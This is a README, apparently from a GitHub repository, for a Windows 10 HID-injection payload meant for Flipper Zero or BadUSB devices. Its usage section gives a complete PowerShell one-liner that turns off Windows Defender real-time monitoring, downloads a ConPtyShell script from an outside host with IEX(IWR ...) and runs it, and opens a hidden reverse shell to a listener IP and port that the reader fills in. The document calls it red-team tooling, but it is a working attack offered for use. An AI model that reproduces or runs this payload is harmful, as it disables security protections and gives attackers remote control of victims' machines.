# 🐚 Admin Reverse Shell Payload

**Author:** [SoggyCow](https://github.com/SoggyCow)  
**Target OS:** Windows 10  
**Interface:** CMD, PowerShell  
**Privilege Level:** Admin Required

---

## 📌 Description

This payload launches an elevated `cmd.exe` session via Task Manager, disables Windows Defender, and executes a hidden PowerShell reverse shell using `Invoke-ConPtyShell`. Designed for adversarial testing, red team ops, and modular deployment via HID devices (e.g., Flipper Zero, BadUSB).

---

## ⚙️ Features

- 🪟 Elevates privileges via Task Manager GUI
- 🛡️ Disables Windows Defender Realtime Monitoring
- 🧠 Executes reverse shell in hidden PowerShell window
- 🧩 Modular and repo-ready for tactical deployment

---

## 🔧 Configuration

Before deployment, replace the following placeholders in the payload:

| Placeholder             | Description                              |
|------------------------|------------------------------------------|
| `[LISTENER_IP_ADDRESS]`| IP address of your Netcat listener       |
| `[PORT]`               | Port number for reverse shell connection |

---

## 🚀 Usage

Deploy via HID injection tools (e.g., Flipper Zero, Rubber Ducky) or manually execute on target systems with GUI access.

```powershell
taskkill /IM taskmgr.exe && powershell -WindowStyle hidden Set-MpPreference -DisableRealtimeMonitoring $true; IEX(IWR 'https://ps1.soggycow.com/remote-access/Invoke-ConPtyShell.ps1' -UseBasicParsing); Invoke-ConPtyShell [LISTENER_IP_ADDRESS] [PORT]